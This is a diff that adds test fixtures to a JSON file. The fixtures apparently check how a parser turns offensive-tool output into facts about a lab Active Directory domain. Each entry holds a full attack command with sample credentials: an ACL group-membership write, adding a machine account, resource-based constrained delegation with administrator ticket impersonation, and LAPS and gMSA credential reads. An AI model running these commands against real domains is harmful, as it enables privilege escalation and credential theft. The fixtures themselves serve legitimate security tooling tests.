@@ -447,6 +447,125 @@
       ]
     },
     {
+      "id": "bloodyad_acl_control_path_only",
+      "tool": "bloodyAD",
+      "action_id": "bloodyad-acl",
+      "domain": "corp.local",
+      "command": "bloodyAD -d corp.local --host 10.10.10.10 -u svc-audit -p 'Spring2026!' add groupMember \"Help Desk Operators\" svc-audit",
+      "stdout": "outputs/bloodyad_acl_control_path_only.txt",
+      "expected_supported_kinds": [
+        "ad.control_paths"
+      ],
+      "expected_facts": [
+        {
+          "kind": "ad.control_paths",
+          "scope": "domain:corp.local",
+          "value_contains": {
+            "rights": ["GenericAll", "WriteMembers"],
+            "operation": "group_member_write"
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "credential.plaintext",
+        "access.admin",
+        "access.system",
+        "foothold.windows"
+      ]
+    },
+    {
+      "id": "addcomputer_machine_candidate_only",
+      "tool": "impacket-addcomputer",
+      "action_id": "delegation-abuse",
+      "domain": "corp.local",
+      "command": "impacket-addcomputer corp.local/svc-audit:Spring2026! -dc-ip 10.10.10.10 -computer-name OBOL$ -computer-pass MachinePass123!",
+      "stdout": "outputs/addcomputer_machine_candidate_only.txt",
+      "expected_supported_kinds": [
+        "ad.computer_added",
+        "credential.candidate"
+      ],
+      "expected_facts": [
+        {
+          "kind": "ad.computer_added",
+          "scope": "domain:corp.local",
+          "value_contains": {"computer": "OBOL$", "password_set": true}
+        },
+        {
+          "kind": "credential.candidate",
+          "scope": "domain:corp.local",
+          "value_contains": {"kind": "machine_account", "user": "OBOL$"}
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "credential.plaintext",
+        "foothold.windows",
+        "access.admin"
+      ]
+    },
+    {
+      "id": "rbcd_getst_ticket_material_only",
+      "tool": "impacket-rbcd+getST",
+      "action_id": "getst-impersonation",
+      "domain": "corp.local",
+      "command": "impacket-rbcd -delegate-from OBOL$ -delegate-to WEB01$ -action write corp.local/svc-audit:Spring2026! && impacket-getST -spn cifs/WEB01.corp.local -impersonate administrator corp.local/OBOL$:MachinePass123!",
+      "stdout": "outputs/rbcd_getst_ticket_material_only.txt",
+      "expected_supported_kinds": [
+        "ad.control_paths",
+        "kerberos.tickets"
+      ],
+      "expected_facts": [
+        {
+          "kind": "ad.control_paths",
+          "scope": "domain:corp.local",
+          "value_contains": {"operation": "rbcd_write"}
+        },
+        {
+          "kind": "kerberos.tickets",
+          "scope": "domain:corp.local",
+          "value_contains": {"principal": "administrator", "files": ["administrator.ccache"]}
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "foothold.windows",
+        "access.admin",
+        "access.system"
+      ]
+    },
+    {
+      "id": "laps_gmsa_material_not_access",
+      "tool": "nxc-laps+gMSADumper",
+      "action_id": "gmsa-read",
+      "domain": "corp.local",
+      "command": "nxc ldap 10.10.10.10 -u svc-audit -p 'Spring2026!' -M laps && gMSADumper.py -u svc-audit -p 'Spring2026!' -d corp.local",
+      "stdout": "outputs/laps_gmsa_material_not_access.txt",
+      "expected_supported_kinds": [
+        "credential.candidate",
+        "credential.ntlm_hash"
+      ],
+      "expected_facts": [
+        {
+          "kind": "credential.candidate",
+          "scope": "domain:corp.local",
+          "value_contains": {"kind": "laps_password", "computer": "WEB01$"}
+        },
+        {
+          "kind": "credential.ntlm_hash",
+          "scope": "domain:corp.local",
+          "value_contains": {"user": "svc_web$", "nthash": "11223344556677889900aabbccddeeff"}
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "credential.plaintext",
+        "foothold.windows",
+        "access.admin",
+        "access.system"
+      ]
+    },
+    {
       "id": "linux_privesc_fixture_leads_only",
       "tool": "linpeas",
       "action_id": "linux-enum",
